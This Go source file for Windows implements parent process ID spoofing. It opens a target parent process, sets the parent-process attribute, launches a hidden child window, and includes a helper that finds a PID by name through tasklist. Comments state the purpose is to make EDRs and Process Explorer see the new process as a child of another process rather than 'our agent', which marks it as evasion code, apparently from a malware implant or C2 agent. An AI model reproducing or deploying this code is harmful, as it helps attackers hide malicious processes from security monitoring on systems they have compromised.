//go:build windows

package main

import (
	"context"
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// startupInfoEx mirrors STARTUPINFOEXW — StartupInfo extended with a process attribute list.
type startupInfoEx struct {
	windows.StartupInfo
	ProcThreadAttributeList uintptr
}

// spawnWithPPID creates a new process whose parent (in the process tree) is parentPID.
// Tools like Process Explorer and EDRs see the process as a child of parentPID, not our agent.
func spawnWithPPID(executable, args string, parentPID uint32) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation

	hParent, err := windows.OpenProcess(processAllAccess, false, parentPID)
	if err != nil {
		return pi, fmt.Errorf("OpenProcess(parent %d): %w", parentPID, err)
	}
	defer windows.CloseHandle(hParent)

	// Query required size for the attribute list (pass nil buffer)
	var attrListSize uintptr
	procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))

	attrBuf := make([]byte, attrListSize)
	r, _, e := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])), 1, 0, uintptr(unsafe.Pointer(&attrListSize)),
	)
	if r == 0 {
		return pi, fmt.Errorf("InitializeProcThreadAttributeList: %v", e)
	}
	defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrBuf[0])))

	r, _, e = procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])),
		0,
		procThreadAttributeParentProcess,
		uintptr(unsafe.Pointer(&hParent)),
		unsafe.Sizeof(hParent),
		0, 0,
	)
	if r == 0 {
		return pi, fmt.Errorf("UpdateProcThreadAttribute: %v", e)
	}

	siEx := startupInfoEx{}
	siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))
	siEx.StartupInfo.Flags = windows.STARTF_USESHOWWINDOW
	siEx.StartupInfo.ShowWindow = windows.SW_HIDE
	siEx.ProcThreadAttributeList = uintptr(unsafe.Pointer(&attrBuf[0]))

	exePtr, _ := windows.UTF16PtrFromString(executable)

	var cmdPtr *uint16
	if args != "" {
		cmd := `"` + executable + `" ` + args
		cmdPtr, _ = windows.UTF16PtrFromString(cmd)
	}

	err = windows.CreateProcess(
		exePtr, cmdPtr, nil, nil, false,
		extendedStartupInfoPresent|createNewConsole,
		nil, nil,
		(*windows.StartupInfo)(unsafe.Pointer(&siEx)),
		&pi,
	)
	if err != nil {
		return pi, fmt.Errorf("CreateProcess: %w", err)
	}
	// Close thread handle — caller owns process handle if needed
	windows.CloseHandle(pi.Thread)
	return pi, nil
}

// pidByName returns the first PID whose image name contains name (case-insensitive).
// Uses tasklist so no additional dependencies are needed.
func pidByName(name string) (uint32, error) {
	out, _, _ := execCMD(context.Background(), `tasklist /FO CSV /NH`)
	nameLower := strings.ToLower(strings.TrimSuffix(strings.ToLower(name), ".exe"))
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ",", 3)
		if len(parts) < 2 {
			continue
		}
		proc := strings.Trim(strings.ToLower(parts[0]), `"`)
		proc = strings.TrimSuffix(proc, ".exe")
		if strings.Contains(proc, nameLower) {
			pidStr := strings.Trim(parts[1], `"`)
			var pid uint32
			fmt.Sscanf(pidStr, "%d", &pid)
			if pid > 0 {
				return pid, nil
			}
		}
	}
	return 0, fmt.Errorf("process %q not found", name)
}
